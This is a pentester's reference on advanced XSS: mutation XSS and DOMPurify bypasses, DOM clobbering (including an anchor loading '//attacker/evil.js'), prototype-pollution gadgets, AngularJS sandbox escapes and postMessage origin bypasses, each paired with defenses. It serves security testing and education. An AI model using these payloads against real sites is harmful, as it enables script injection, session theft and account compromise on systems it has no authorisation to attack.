# Advanced XSS techniques (the expert core)

These are the techniques that find XSS on mature targets where plain injection is dead: mutation XSS / sanitizer bypass, DOM clobbering, prototype-pollution-to-XSS, client-side template injection, and postMessage DOM XSS. Mechanisms are explained so you can recognize and adapt them; payloads are minimal representative fragments. Sources: notes 09, 12, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 28.

## Mutation XSS (mXSS) and sanitizer bypass
**Why it exists:** a client-side sanitizer does `parse -> sanitize the DOM tree -> serialize -> the app inserts via innerHTML -> the browser parses AGAIN`. The sanitizer and the browser share a parser, but `parse(serialize(tree)) != tree` in edge cases, so a tree that was safe becomes dangerous on re-parse. The lever is **namespace confusion**: the same tag parses differently in HTML vs SVG vs MathML foreign content (notably `<style>`: text in HTML, elements in SVG/MathML).

Primitives (notes 12, 20, 21, 22, 23):
- **Namespace confusion (Bentkowski family).** Open MathML/SVG foreign content plus `style`, then let the close of the foreign context flip an inert element into a live HTML one. Representative shape: `<form><math><mtext><!--</mtext--><form><mglyph><style></math><img src onerror=alert(1)></style></mglyph></form></mtext></math></form>` and the SVG-to-back variants. The sanitizer sees an inert/misplaced `img`; the re-parse materializes `img onerror`.
- **Node-type smuggling (note 12).** When a sanitizer only inspects text nodes, hide the mutation in a **comment** (Chrome) or **CDATA** (Firefox) node inside `style`; the real payload sits encoded in an attribute (`title="--&gt;&lt;img src=1 onerror=...&gt;"`) and re-materializes on re-parse.
- **Clobbering the sanitizer's own state (note 22).** DOMPurify's depth-limit fixes read `parentNode`/`__depth`; DOM-clobber those names (`<input name="parentNode">`, second-order clobber via attribute-trim `id="x "`) to reset the counter and reuse a nesting mutation.
- **Node flattening / nesting (note 22).** Browsers cap DOM nesting (~512) and flatten deeper trees, reshaping markup on re-parse (the `<div*506>...<table><caption><svg>...<style><a id="</style><img onerror>">` form).
- **Re-parse count (note 22).** Apps that sanitize/parse more than once (e.g. Mermaid calls DOMPurify twice) are broken by form/table reordering that only surfaces on the 2nd/3rd parse: `<form><table></form><form></table></form><div></div>`.

**How to test:** identify the sanitizer and version; if DOMPurify, map the version to the known bypass series; try namespace-confusion and node-smuggling payloads; confirm with a benign `onerror`. **Defense to cite:** sanitize once and insert the DOM node (`RETURN_DOM`/assign the node), never re-serialize-then-reparse; keep the sanitizer current.

## DOM clobbering (note 13)
Named HTML elements are exposed as properties on `document`/`window` by their `id`/`name`. When JS reads a variable/property it never defined, the named-element lookup can resolve to an attacker-planted element, so **HTML injection alone controls a JS value**, no script needed.
- Target: code that builds a sink value (often `script.src`) from an undefined config global. Under a `nonce` + `strict-dynamic` CSP, a nonce-approved loader is trusted to create further scripts, so a clobbered URL flowing into `script.src` executes, defeating the host allowlist.
- Multi-level property clobber with two same-id anchors: `<a id=ehy><a id=ehy name=codeBasePath href=//attacker/evil.js>` (two `a` with the same `id` form a collection; the second's `name`+`href` supplies the nested value). Handle an appended path tail (e.g. `/utils.js`) with a trailing `//` comment or `?`.
- **Defense to cite:** initialize config variables explicitly; never build `script.src` from DOM-reachable names; namespace config so element `id`/`name` cannot shadow it. CSP alone does not stop this.

## Prototype pollution to DOM XSS (notes 16, 19, 28)
Two bugs: a **source** that writes `Object.prototype` and a **gadget** that reads an unset property into a sink.
- **Find the source:** `?__proto__[foo]=bar` (also `?__proto__.foo=bar`, the URL fragment, and JSON bodies); confirm `Object.prototype.foo === 'bar'` in the console. If `__proto__` is stripped, try the constructor route (`obj.constructor.prototype`) or non-recursive collapse (`__pro__proto__to__`).
- **Find the gadget:** instrument with `Object.defineProperty(Object.prototype,'PROP',{get(){console.trace();return 'polluted'}})` and watch the stack for a read that reaches `innerHTML`/`eval`/`script.src`/`setTimeout`. DOM Invader automates source+gadget discovery.
- **Widespread gadgets (ship in dependencies most sites already have):** `fetch` options (`Object.prototype.body=...`), `Object.defineProperty` missing `value`, storage property access (`localStorage.foo`), Google Analytics `hitCallback`->`setTimeout`, Google Tag Manager `sequence`->`eval` (`?__proto__[sequence]=alert(document.domain)-`), Adobe DTM, and the cheat-sheet library table (jQuery `$(html)`, `$.getScript src`, Lodash `_.template sourceURL`, sanitize-html, reCAPTCHA `srcdoc`, DOMPurify `ALLOWED_ATTR`). See note 17's gadget table.
- **Defense to cite:** null-prototype objects for option/config (`Object.create(null)`), always specify `value` in descriptors, read storage via `getItem`, freeze `Object.prototype`, audit bundled libs.

## Client-side template injection (AngularJS, notes 14, 15, 17)
If the page is an AngularJS template (`ng-app` above the reflection), a reflected `{{expression}}` evaluates, XSS even when HTML is correctly encoded. The expression "sandbox" (pre-1.6) is an expression rewriter, not a security boundary, and was removed in 1.6.
- Confirm: `{{7*7}}` -> `49`.
- Version-matched escape families (minimal forms):
  - 1.0.1-1.1.5 and >=1.6.0: `{{constructor.constructor('alert(1)')()}}` (shorter `{{$on.constructor('alert(1)')()}}`).
  - ~1.2.24-1.4.9 (charAt override): `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}`.
  - 1.5.x: `{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}`.
  - DOM-based (orderBy context, no `$eval`): `[1]|orderBy:'[].constructor.from([1],alert)'`.
- Under CSP (all versions): `<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">`.
- **No strings AND no `$eval` (hardest variant, ~1.2.x-1.4.x; validated against the PortSwigger Expert lab, eval case-04).** When the app blocks quotes (`'`/`"` are stripped or HTML-encoded) and `$eval` is unavailable, every escape above is dead because they all embed a string literal. Build the payload with zero quotes:
  1. Break the sandbox's per-character string inspection by overriding `String.prototype.charAt` with `Array.prototype.join`: `toString().constructor.prototype.charAt=[].join;`
  2. Produce the code to run from char codes (no quotes) via `String.fromCharCode`, evaluated through the `orderBy` filter: `[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1` (those codes spell `x=alert(1)`).
  - Full minimal payload: `toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`. Shorten it under a length cap by assigning the String constructor to a variable once and reusing it: `x=toString().constructor;x.prototype.charAt=[].join;[1]|orderBy:x.fromCharCode(...)=1` (~116 chars).
  - **Find the real sink and where it reads from.** This class often appears where the app passes something you control to `$parse(...)(...)` (the lab's controller ran `$parse(key)` on each query-parameter **name**, so the payload is a second parameter name: `?search=1&<expr>=1`, URL-encoding the inner `=` so the name is not split). Reflection into a `{{ }}`-rendered field or a `$scope` assignment may be inert; the exploitable sink is wherever user input reaches `$parse`/`$interpolate`/`$eval`. A length limit on one reflection (e.g. the visible search value) may not apply to another (the param name).
- **Defense to cite:** never reflect user input (value OR key/parameter name) into a template or into `$parse`/`$interpolate`; do not rely on sandbox/version.

## postMessage / web-message DOM XSS (notes 07, 08, 18)
A cross-frame `message` listener is a DOM source. It is exploitable when origin validation is missing or weak and `event.data` reaches a sink.
- Origin-check failure modes: no check; naive `origin.indexOf('trusted')`/`includes`/`endsWith` (bypass with `trusted.attacker.com` or `attacker.com/trusted`); `null` origin (sandboxed iframe / data URL); and the strong case, **the allowlisted origin itself has XSS** (Jetpack trusted widgets.wp.com, which had a DOM XSS), so a message genuinely sent from the allowed origin carries the payload.
- Sink: the message field assigned to `innerHTML`/`eval`/`document.write` (Jetpack `avatar_URL` -> `innerHTML`).
- **How to test:** enumerate `addEventListener('message')` handlers (DOM Invader web-message mode); host an iframe that `postMessage`s crafted data; check the origin logic and the sink. If origin is allowlisted, pivot to XSS on the allowed origin.
- **Defense to cite:** validate `event.origin` against an exact allowlist AND encode/validate every message field before any HTML sink.
